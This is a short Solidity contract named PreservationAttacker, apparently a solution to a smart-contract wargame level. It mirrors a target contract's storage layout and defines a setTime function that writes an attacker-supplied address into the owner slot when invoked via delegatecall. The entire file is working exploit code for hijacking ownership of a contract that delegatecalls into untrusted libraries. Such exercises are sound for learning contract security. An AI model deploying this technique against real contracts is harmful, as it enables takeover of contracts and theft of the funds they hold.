pragma solidity ^0.8.0;

contract PreservationAttacker {

    // copying storage layout from Preservation contract
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner; 

    // @dev must conform to the setTimeSignature - sets new owner in correct slot
    function setTime(uint256 _time) public {
        address newOwner = address(uint160(_time));
        owner = newOwner;
    }

}